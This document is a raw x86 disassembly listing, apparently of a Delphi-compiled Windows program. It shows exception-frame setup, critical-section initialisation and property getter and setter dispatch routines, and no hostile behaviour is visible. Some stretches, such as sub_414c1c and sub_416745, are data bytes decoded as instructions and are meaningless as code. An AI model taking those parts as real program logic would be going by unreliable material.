inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_40313c
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4041e0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407fbc
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_414af8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414b67
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b6e
retn
call sub_41469c
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4051c0
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a04
mov eax rw-data
call sub_403f7c
mov eax rw-data
call sub_40f234
sub_414b70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414c11
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c18
retn
mov eax rw-data
call sub_4145f8
mov eax sub_40ef34
mov [ rw-data ] eax
mov eax sub_40ea84
mov [ rw-data ] eax
mov edx sub_40e994
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f234
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4141ec
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f548
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412538
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412c60
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_414c1c
push 0xae004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + 0x680000ff ] ch
xchg esi eax
dec eax
add [ eax + 0x680000ff ] dl
xchg esi eax
dec eax
add [ ecx + 0x680000ff ] dl
xchg esi eax
dec eax
add [ edx + 0x680000ff ] dl
xchg esi eax
dec eax
add [ ebx + 0x680000ff ] dl
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x69980000 ] dl
dec eax
add [ ebp + 0x680000ff ] dl
xchg esi eax
dec eax
add [ esi + 0x680000ff ] dl
xchg esi eax
dec eax
add [ edi + 0x680000ff ] dl
xchg esi eax
dec eax
add [ eax + 0x680000ff ] bl
xchg esi eax
dec eax
add [ ecx + 0x680000ff ] bl
xchg esi eax
dec eax
add [ edx + 0x680000ff ] bl
xchg esi eax
dec eax
add [ ebx + 0x680000ff ] bl
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x69980000 ] bl
dec eax
add [ ebp + 0x680000ff ] bl
xchg esi eax
dec eax
add [ esi + 0x680000ff ] bl
xchg esi eax
dec eax
add [ edi + 0x680000ff ] bl
xchg esi eax
dec eax
add [ eax + 0x680000ff ] al
xchg esi eax
dec eax
add [ ecx + 0x680000ff ] al
xchg esi eax
dec eax
add [ edx + 0x680000ff ] al
xchg esi eax
dec eax
add [ ebx + 0x680000ff ] al
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x69980000 ] al
dec eax
add [ ebp + 0x680000ff ] al
xchg esi eax
dec eax
add [ esi + 0x680000ff ] al
xchg esi eax
dec eax
add [ edi + 0x680000ff ] al
xchg esi eax
dec eax
add [ eax + 0x680000ff ] cl
xchg esi eax
dec eax
add [ ecx + 0x680000ff ] cl
xchg esi eax
dec eax
add [ edx + 0x680000ff ] cl
xchg esi eax
dec eax
add [ ebx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_414d31
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d38
retn
sub_414d7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414e3a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_414d70
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_414d70
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_4081bc
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_403fd0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_407fbc
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e41
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407edc
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_403fd0
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_4041e0
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_414e54
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414ea0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_414d70
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4082f8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414e54
mov edx [ rw-data ]
mov eax esi
call sub_407fbc
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407fbc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4082f8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414f04
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_414f74
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414fc8
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_414ff8
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_41506c
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4150c8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_41510c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415188
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404218
mov ecx esp
mov edx esi
mov eax ebx
call sub_41510c
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4151d0
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_4151bc
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_415210
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4151bc
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415250
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415298
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41536c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404204
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41529f
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
sub_4152a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4152f0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4047a8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_415454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4152f7
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
sub_415300
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_415160
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_4151d0
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_415250
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403f7c
pop ebx
retn
sub_415340
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_415188
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_415210
pop ebx
retn
dec bl
je r-xdata
call sub_4152a8
jmp r-xdata
pop ebx
retn
sub_41536c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_415444
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_415300
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4047a8
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41544b
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404698
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40465c
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415454
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41551a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404204
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_415340
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415521
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404698
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415528
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_414d70
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_415568 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_414d70
cmp [ eax ] 0x4
jne r-xdata
sub_415640
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_414d70
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_415688 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4157b7 ]
jmp [ eax * 4 + jump_table_415724 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_41584c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_415838
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_41588c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_415838
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4158cc
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_41590c
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_415944
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_41596c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4159a8
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_4058b8
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415a28
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4058b8
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415a9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415ae2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ae9
retn
mov eax rw-data
call sub_403f7c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a04
sub_415dfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415e21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e28
retn
sub_416745
and [ edi + 0x41 ] esp
add [ edi ] ch
inc ecx
add [ ecx ] bh
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
inc ebp
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x67c00040 ] cl
inc ecx
add [ ecx + 0x67 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add al dl
inc ecx
add ah bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
inc ecx
add [ eax + eax ] cl
add [ eax ] al
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
inc eax
add [ ebp + edx * 4 + 0x41 ] bh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
add ah al
xchg esp eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ esi + edx * 4 ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx + 0x40040 ] dl
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x69 ] ch
xor al 0x40
imul esi [ ebx + 0x74 ] 0xfc746e65
inc ecx
add [ edi ] al
adc eax 0x746e4954
